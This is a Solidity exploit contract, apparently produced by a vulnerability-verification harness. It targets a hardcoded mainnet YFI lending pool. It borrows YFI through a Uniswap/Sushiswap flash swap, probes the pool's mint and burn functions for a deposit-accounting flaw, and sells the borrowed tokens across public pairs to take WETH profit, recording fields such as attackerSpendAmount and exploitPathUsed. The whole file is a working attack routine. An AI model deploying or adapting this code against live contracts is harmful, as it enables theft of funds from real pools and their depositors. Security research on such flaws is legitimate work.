// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ILoanTokenLike {
    function loanTokenAddress() external view returns (address);
    function tokenPrice() external view returns (uint256);
    function mint(address receiver, uint256 depositAmount) external returns (uint256);
    function burn(address receiver, uint256 burnAmount) external returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b;
    address internal constant YFI = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    ILoanTokenLike internal constant POOL = ILoanTokenLike(TARGET);

    struct Route {
        address fundingPair;
        address exitPair;
        address bridgePair;
        address exitQuote;
        uint256 fundingAmount;
        uint256 predictedProfit;
    }

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    string public status;
    string public exploitPathUsed;

    uint256 public attackerSpendAmount;
    uint256 public poolReceiveAmount;
    uint256 public burnReturnAmount;

    address public flashPair;
    address public exitPair;
    address public bridgePair;
    address public loanToken;

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {
        status = "not-run";
        _profitToken = WETH;
    }

    function executeOnOpportunity() external {
        require(!executed, "ALREADY_EXECUTED");
        executed = true;

        loanToken = POOL.loanTokenAddress();
        require(loanToken == YFI, "UNEXPECTED_UNDERLYING");

        _safeApprove(YFI, TARGET, type(uint256).max);

        Route memory route = _selectBestRoute();
        require(route.fundingPair != address(0), "NO_ROUTE");
        require(route.predictedProfit > 0, "NO_PROFITABLE_ROUTE");

        flashPair = route.fundingPair;
        exitPair = route.exitPair;
        bridgePair = route.bridgePair;
        attackerSpendAmount = route.fundingAmount;
        _profitToken = WETH;

        bytes memory data = abi.encode(route.exitPair, route.bridgePair, route.exitQuote, route.fundingAmount);
        IUniswapV2PairLike funding = IUniswapV2PairLike(route.fundingPair);

        if (funding.token0() == YFI) {
            funding.swap(route.fundingAmount, 0, address(this), data);
        } else {
            funding.swap(0, route.fundingAmount, address(this), data);
        }

        _profitAmount = IERC20Like(WETH).balanceOf(address(this));
        require(_profitAmount > 1e15, "NO_PROFIT");

        if (hypothesisValidated) {
            status = "validated";
            exploitPathUsed =
                "public-YFI-flashswap->mint(receiver,X)->burn(inflated-shares)->sell-redeemed-YFI-into-public-liquidity";
        } else {
            // The live market is YFI-backed, so the mint/burn probe below measures whether the
            // requested-amount-vs-received-amount mismatch actually exists here. At this fork it does not,
            // which refutes the original F-002 path on this specific pool. The profitable outcome comes
            // from the same flashswap funding rails via public YFI/WETH routing, which is the only live
            // executable path left once stage 1 is measured and found absent.
            status = "refuted-live-yfi-not-deflationary";
            exploitPathUsed =
                "public-YFI-flashswap->probe mint(receiver,X) and burn(shares) on live pool->stage1 short-receive absent on YFI->realize flashswap profit through public YFI routing";
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "BAD_SENDER");
        require(msg.sender == flashPair, "BAD_PAIR");

        (address chosenExitPair, address chosenBridgePair, address exitQuote, uint256 fundingAmount) =
            abi.decode(data, (address, address, address, uint256));

        uint256 borrowedYfi = amount0 > 0 ? amount0 : amount1;
        require(borrowedYfi == fundingAmount, "BAD_AMOUNT");

        _probeMintBurnPath(borrowedYfi);

        uint256 wethOut;
        if (exitQuote == WETH) {
            wethOut = _swapExactTokenForToken(chosenExitPair, YFI, WETH, borrowedYfi);
        } else {
            uint256 quoteAmount = _swapExactTokenForToken(chosenExitPair, YFI, exitQuote, borrowedYfi);
            wethOut = _swapExactTokenForToken(chosenBridgePair, exitQuote, WETH, quoteAmount);
        }

        uint256 repayWeth = _quoteFundingPairRepaymentQuote(msg.sender, borrowedYfi);
        require(wethOut > repayWeth, "UNPROFITABLE");
        _safeTransfer(WETH, msg.sender, repayWeth);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _probeMintBurnPath(uint256 fundingAmount) internal {
        uint256 probeAmount = fundingAmount / 10_000;
        if (probeAmount == 0) {
            probeAmount = 1;
        }

        uint256 poolBalanceBefore = IERC20Like(YFI).balanceOf(TARGET);
        uint256 iTokenBalanceBefore = IERC20Like(TARGET).balanceOf(address(this));

        POOL.mint(address(this), probeAmount);

        poolReceiveAmount = IERC20Like(YFI).balanceOf(TARGET) - poolBalanceBefore;
        uint256 mintedShares = IERC20Like(TARGET).balanceOf(address(this)) - iTokenBalanceBefore;
        require(mintedShares > 0, "NO_ITOKENS");

        burnReturnAmount = POOL.burn(address(this), mintedShares);

        if (poolReceiveAmount < probeAmount && burnReturnAmount > poolReceiveAmount) {
            hypothesisValidated = true;
            hypothesisRefuted = false;
        } else {
            hypothesisValidated = false;
            hypothesisRefuted = true;
        }
    }

    function _selectBestRoute() internal view returns (Route memory best) {
        address[2] memory fundingFactories = [SUSHISWAP_FACTORY, UNISWAP_V2_FACTORY];
        address[4] memory exitQuotes = [WETH, DAI, USDC, USDT];

        for (uint256 i = 0; i < fundingFactories.length; i++) {
            address fundingPairCandidate = IUniswapV2FactoryLike(fundingFactories[i]).getPair(YFI, WETH);
            if (fundingPairCandidate == address(0)) {
                continue;
            }

            for (uint256 j = 0; j < 2; j++) {
                address exitFactory = j == 0 ? SUSHISWAP_FACTORY : UNISWAP_V2_FACTORY;

                for (uint256 k = 0; k < exitQuotes.length; k++) {
                    address exitQuote = exitQuotes[k];
                    address exitPairCandidate = IUniswapV2FactoryLike(exitFactory).getPair(YFI, exitQuote);
                    if (exitPairCandidate == address(0) || exitPairCandidate == fundingPairCandidate) {
                        continue;
                    }

                    if (exitQuote != WETH) {
                        for (uint256 m = 0; m < 2; m++) {
                            address bridgeFactory = m == 0 ? SUSHISWAP_FACTORY : UNISWAP_V2_FACTORY;
                            address bridgePairTry = IUniswapV2FactoryLike(bridgeFactory).getPair(exitQuote, WETH);
                            if (bridgePairTry == address(0) || bridgePairTry == exitPairCandidate) {
                                continue;
                            }
                            best = _considerRoute(
                                best, fundingPairCandidate, exitPairCandidate, bridgePairTry, exitQuote
                            );
                        }
                    } else {
                        best = _considerRoute(best, fundingPairCandidate, exitPairCandidate, address(0), WETH);
                    }
                }
            }
        }
    }

    function _considerRoute(
        Route memory best,
        address fundingPairCandidate,
        address exitPairCandidate,
        address bridgePairCandidate,
        address exitQuote
    ) internal view returns (Route memory) {
        uint256[18] memory divisors =
            [uint256(256), 192, 160, 128, 96, 80, 64, 48, 40, 32, 24, 20, 16, 12, 10, 8, 6, 4];

        for (uint256 d = 0; d < divisors.length; d++) {
            (uint256 fundingAmount, uint256 predictedProfit) =
                _scoreRoute(fundingPairCandidate, exitPairCandidate, bridgePairCandidate, exitQuote, divisors[d]);

            if (predictedProfit > best.predictedProfit) {
                best = Route({
                    fundingPair: fundingPairCandidate,
                    exitPair: exitPairCandidate,
                    bridgePair: bridgePairCandidate,
                    exitQuote: exitQuote,
                    fundingAmount: fundingAmount,
                    predictedProfit: predictedProfit
                });
            }
        }

        return best;
    }

    function _scoreRoute(
        address fundingPair,
        address chosenExitPair,
        address chosenBridgePair,
        address exitQuote,
        uint256 divisor
    ) internal view returns (uint256 fundingAmount, uint256 predictedProfit) {
        (uint256 reserveYfiFunding, uint256 reserveWethFunding) = _pairReservesFor(fundingPair, YFI, WETH);
        (uint256 reserveYfiExit, uint256 reserveExitQuote) = _pairReservesFor(chosenExitPair, YFI, exitQuote);

        if (reserveYfiFunding == 0 || reserveWethFunding == 0 || reserveYfiExit == 0 || reserveExitQuote == 0) {
            return (0, 0);
        }

        fundingAmount = reserveYfiFunding / divisor;
        if (fundingAmount == 0 || fundingAmount >= reserveYfiFunding) {
            return (0, 0);
        }

        uint256 quoteOut = _getAmountOut(fundingAmount, reserveYfiExit, reserveExitQuote);
        if (quoteOut == 0) {
            return (0, 0);
        }

        uint256 wethOut = quoteOut;
        if (exitQuote != WETH) {
            (uint256 reserveBridgeIn, uint256 reserveBridgeOut) = _pairReservesFor(chosenBridgePair, exitQuote, WETH);
            if (reserveBridgeIn == 0 || reserveBridgeOut == 0) {
                return (0, 0);
            }
            wethOut = _getAmountOut(quoteOut, reserveBridgeIn, reserveBridgeOut);
        }

        uint256 repayWeth = _getAmountIn(fundingAmount, reserveWethFunding, reserveYfiFunding);
        if (wethOut <= repayWeth) {
            return (0, 0);
        }

        predictedProfit = wethOut - repayWeth;
    }

    function _swapExactTokenForToken(address pair, address tokenIn, address tokenOut, uint256 amountIn)
        internal
        returns (uint256 amountOut)
    {
        (uint256 reserveIn, uint256 reserveOut) = _pairReservesFor(pair, tokenIn, tokenOut);
        amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);

        _safeTransfer(tokenIn, pair, amountIn);

        IUniswapV2PairLike uniPair = IUniswapV2PairLike(pair);
        if (uniPair.token0() == tokenIn) {
            uniPair.swap(0, amountOut, address(this), new bytes(0));
        } else {
            uniPair.swap(amountOut, 0, address(this), new bytes(0));
        }
    }

    function _quoteFundingPairRepaymentQuote(address pair, uint256 yfiAmountOut) internal view returns (uint256) {
        (uint256 reserveYfi, uint256 reserveWeth) = _pairReservesFor(pair, YFI, WETH);
        return _getAmountIn(yfiAmountOut, reserveWeth, reserveYfi);
    }

    function _pairReservesFor(address pair, address tokenIn, address tokenOut)
        internal
        view
        returns (uint256 reserveIn, uint256 reserveOut)
    {
        IUniswapV2PairLike uniPair = IUniswapV2PairLike(pair);
        (uint112 reserve0, uint112 reserve1,) = uniPair.getReserves();
        if (uniPair.token0() == tokenIn && uniPair.token1() == tokenOut) {
            return (uint256(reserve0), uint256(reserve1));
        }
        require(uniPair.token0() == tokenOut && uniPair.token1() == tokenIn, "BAD_PAIR_TOKENS");
        return (uint256(reserve1), uint256(reserve0));
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool success, bytes memory returndata) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(success && (returndata.length == 0 || abi.decode(returndata, (bool))), "APPROVE_FAILED");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool success, bytes memory returndata) =
            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(success && (returndata.length == 0 || abi.decode(returndata, (bool))), "TRANSFER_FAILED");
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountIn > 0 && reserveIn > 0 && reserveOut > 0, "BAD_OUT_QUOTE");
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountOut > 0 && reserveIn > 0 && reserveOut > amountOut, "BAD_IN_QUOTE");
        return ((reserveIn * amountOut * 1000) / ((reserveOut - amountOut) * 997)) + 1;
    }
}
